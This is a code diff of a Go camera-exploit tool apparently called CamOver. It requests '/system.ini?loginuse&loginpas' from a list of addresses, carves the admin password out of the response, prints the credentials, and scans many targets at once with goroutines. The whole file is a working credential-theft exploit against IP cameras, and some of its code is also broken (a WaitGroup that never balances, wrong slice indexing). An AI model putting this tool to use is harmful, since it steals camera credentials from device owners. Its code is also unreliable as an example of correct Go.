@@ -3,97 +3,107 @@ package pkg
 import (
 	"crypto/tls"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"regexp"
 	"strings"
+	"sync"
 )
 
-type CamoverCli struct {
-	delay float32
-	cam   Camover
-}
-
-type Camover struct {
+type CamOver struct {
 	username string
 }
 
-type Account struct {
-	Username string
-	Password string
+type CamOverCli struct {
+	CamOver     CamOver
+	threadDelay float64
 }
 
-func NewCamover() *Camover {
-	return &Camover{
-		username: "admin",
-	}
+type CamAccount struct {
+	username string
+	password string
 }
 
-func (c *Camover) Exploit(address string) (*Account, error) {
-	uri := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)
+func (c *CamOver) Exploit(address string) (*CamAccount, error) {
+	c.username = "admin"
 
-	transport := &http.Transport{
+	transport := http.Transport{
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: false,
 		},
 	}
 
 	client := &http.Client{
-		Transport: transport,
+		Transport: &transport,
 	}
 
-	request, err := http.NewRequest(http.MethodGet, uri, nil)
+	target := fmt.Sprintf("http://%s/system.ini?loginuse&loginpas", address)
+
+	request, err := http.NewRequest(http.MethodGet, target, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	response, err := client.Do(request)
+	resp, err := client.Do(request)
 
 	if err != nil {
 		return nil, err
 	}
 
-	defer response.Body.Close()
+	defer resp.Body.Close()
 
-	if response.StatusCode == 200 {
+	if resp.StatusCode == http.StatusOK {
+		account := &CamAccount{}
+
 		re := regexp.MustCompile(`[^\x00-\x1F\x7F-\xFF]{4,}`)
 
-		matches := re.FindAll([]byte(""), -1)
+		content, _ := ioutil.ReadAll(resp.Body)
 
-		for match := range matches {
-			if strings.Contains(string(match), c.username) {
-				var account Account
+		patternString := re.FindAllSubmatch([]byte(content), -1)
 
-				account.Username = c.username
-				account.Password = ""
-				return &account, nil
+		for index, val := range patternString {
+			if strings.Contains(string(val[index]), c.username) {
+				account.username = "admin"
+				userIndex := strings.Index(string(val[index]), account.username)
+				account.password = string(val[userIndex+1])
+
+				return account, nil
+			} else {
+				continue
 			}
 		}
-
 	}
 
 	return nil, err
 }
 
-func NewCamoverCli(delay float32) *CamoverCli {
-	return &CamoverCli{
-		delay: delay,
-	}
-}
-
-func (c *CamoverCli) run(address string) bool {
-	res, err := c.cam.Exploit(address)
+func (c *CamOverCli) thread(address string) bool {
+	account, err := c.CamOver.Exploit(address)
 	if err != nil {
 		return false
 	}
 
-	Info(fmt.Sprintf("%s %s", res.Username, res.Password))
+	Success(fmt.Sprintf("username : %s - password : %s", account.username, account.password))
+
 	return true
 }
 
-func (c *CamoverCli) crack(addresses []string) {
-	for _, address := range addresses {
-		_ = c.run(address)
-	}
-}
+func (c *CamOverCli) crack(addresses []string) {
+	var wg sync.WaitGroup
 
-func (c *CamoverCli) start() {}
+	for _, address := range addresses {
+		wg.Add(3)
+		defer wg.Done()
+
+		go func(address string) {
+			ok := c.thread(address)
+			if ok {
+				Process("")
+			} else {
+				Errorf("")
+			}
+		}(address)
+	}
+
+	wg.Wait()
+}
